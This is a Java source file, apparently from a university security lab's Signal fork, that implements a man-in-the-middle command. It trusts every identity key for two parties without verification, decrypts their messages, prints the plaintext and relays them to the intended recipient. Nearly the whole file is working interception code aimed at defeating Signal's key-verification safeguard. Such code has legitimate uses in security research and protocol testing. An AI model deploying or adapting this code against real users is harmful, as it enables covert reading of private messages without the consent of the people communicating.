package org.whispersystems.textsecuregcm.mallory;

import org.whispersystems.textsecuregcm.mallory.mysignal.manager.Manager;

import java.util.*;

import org.whispersystems.textsecuregcm.mallory.mysignal.storage.contacts.ContactInfo;
import org.whispersystems.signalservice.api.messages.*;
import org.whispersystems.signalservice.api.push.SignalServiceAddress;
import org.whispersystems.signalservice.api.push.exceptions.EncapsulatedExceptions;

import java.util.List;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

import static org.whispersystems.textsecuregcm.mallory.mysignal.util.ErrorUtils.handleAssertionError;

/**
 * This class was built by BYU's ISRL lab.
 */
public class MitmCommand implements LocalCommand {

    @Override
    public int handleCommand(final Manager m, String from, String to) {

        if (!m.isRegistered()) {
            System.err.println("User is not registered.");
            return 1;
        }

        // Trust everyone!!! We are mallory we want to read everything!
        m.trustIdentityAllKeys(from);
        m.trustIdentityAllKeys(to);

        // Decrypt messages!
        List<String> messages = receive(m);
        for (String message : messages) {
            // sends messages to intended recipient.
            System.out.println("To: " + to + " Message: " + message);
            send(to, message, m);
        }

        return 0;
    }

    /**
     * Sends message to recipient.
     */
    public void send(String to, String message, Manager m) {
        List<String> attachments = new ArrayList<String>();

        try {
            m.sendMessage(message, attachments, to);
        } catch (EncapsulatedExceptions e) {
            e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Decrypts an encrypted message!.
     */
    public List<String> receive(final Manager m) {

        double timeout = 1;
        boolean ignoreAttachments = true;
        boolean returnOnTimeout = true;

        try {
            final Manager.ReceiveMessageHandler handler = new MitmMessageHandler(m);
            m.receiveMessages((long) (500), TimeUnit.MILLISECONDS, returnOnTimeout, ignoreAttachments, handler);
            return ((MitmMessageHandler) handler).getMail();
        } catch (IOException e) {
            System.err.println("Error while receiving messages: " + e.getMessage());
            return null;
        } catch (AssertionError e) {
            handleAssertionError(e);
            return null;
        }
    }

    /**
     * Override of standard message handler, using to Man in the Middle.
     */
    public class MitmMessageHandler implements Manager.ReceiveMessageHandler {

        final Manager m;
        List<String> mailbox;

        public MitmMessageHandler(Manager m) {
            this.m = m;
            this.mailbox = new ArrayList<String>();
        }

        public List<String> getMail() {
            return mailbox;
        }

        @Override
        public void handleMessage(SignalServiceEnvelope envelope, SignalServiceContent content, Throwable exception) {
            SignalServiceAddress source = envelope.getSourceAddress();
            ContactInfo sourceContact = m.getContact(source.getNumber());

            if (envelope.isReceipt()) {
                return;
            } else if (envelope.isSignalMessage() | envelope.isPreKeySignalMessage()) {
                if (exception != null) {
                    if (exception instanceof org.whispersystems.libsignal.UntrustedIdentityException) {
                        org.whispersystems.libsignal.UntrustedIdentityException e = (org.whispersystems.libsignal.UntrustedIdentityException) exception;
                        System.out.println("The user’s key is untrusted, either the user has reinstalled Signal or a third party sent this message.");
                        System.out.println("Use 'mysignal-cli -u " + m.getUsername() + " listIdentities -n " + e.getName() + "', verify the key and run 'mysignal-cli -u " + m.getUsername() + " trust -v \"FINGER_PRINT\" " + e.getName() + "' to mark it as trusted");
                        System.out.println("If you don't care about security, use 'mysignal-cli -u " + m.getUsername() + " trust -a " + e.getName() + "' to trust it without verification");
                    } else {
                        System.out.println("Exception: " + exception.getMessage() + " (" + exception.getClass().getSimpleName() + ")");
                    }
                }
                if (content == null) {
                    System.out.println("Failed to decrypt message.");
                } else {
                    if (content.getDataMessage().isPresent()) {
                        SignalServiceDataMessage message = content.getDataMessage().get();
                        mailbox.add(handleSignalServiceDataMessage(message));
                    }
                }
            } else {
                System.out.println("Unknown message received.");
            }
            System.out.println();
        }

        /**
         * Gets the decrypted message!
         */
        private String handleSignalServiceDataMessage(SignalServiceDataMessage message) {
            String body = "";
            if (message.getBody().isPresent()) {
                body = message.getBody().get();
            }
            return body;
        }
    }
}